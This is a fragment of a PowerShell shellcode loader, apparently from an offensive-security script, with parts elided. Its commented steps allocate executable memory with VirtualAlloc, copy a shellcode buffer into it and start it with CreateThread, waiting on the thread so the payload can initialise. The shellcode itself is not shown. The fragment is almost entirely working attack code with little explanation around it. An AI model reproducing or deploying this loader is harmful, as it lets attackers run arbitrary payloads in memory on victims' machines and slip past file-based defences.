...
#Lookup Function locations, create delegate types, and link them
...
#Allocate Shellcode Bytes
$shellyAddr = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000,0x40)
#Copy Shellcode into memory allocation
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $shellyAddr,$buf.Length)
#Call CreateThread to spawn shell
$hthread = $CreateThread.Invoke([IntPtr]::Zero,0, $shellyAddr, [IntPtr]::Zero,0,[IntPtr]::Zero)
#Call WaitForSingleObject to induce a delay which waits for initialization of the payload
$WaitForSingleObject.Invoke($hthread, 0xFFFFFFF)
